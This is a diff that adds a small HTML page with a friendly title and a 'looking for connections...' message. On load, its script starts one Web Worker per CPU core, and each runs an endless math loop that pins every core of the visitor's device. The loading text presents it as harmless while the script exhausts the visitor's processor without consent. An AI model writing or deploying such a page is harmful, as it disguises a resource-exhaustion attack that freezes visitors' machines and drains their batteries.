@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>HEY How are you</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+    .status { font-size: 24px; margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <h1>🔥 wait for a moment</h1>
+  <p>looking for connections...</p>
+  <div class="status" id="status">Running...</div>
+
+  <script>
+    function stressCPU() {
+      const workers = [];
+      const coreCount = navigator.hardwareConcurrency || 4;
+
+      for (let i = 0; i < coreCount; i++) {
+        const worker = new Worker(URL.createObjectURL(new Blob([`
+          while (true) {
+            let x = 0;
+            for (let i = 0; i < 1e9; i++) {
+              x += Math.sqrt(i) * Math.sin(i);
+            }
+          }
+        `])));
+        workers.push(worker);
+      }
+
+      document.getElementById("status").innerText = "🔥 Stressing " + coreCount + " cores...";
+    }
+
+    stressCPU();
+  </script>
+</body>
+</html>
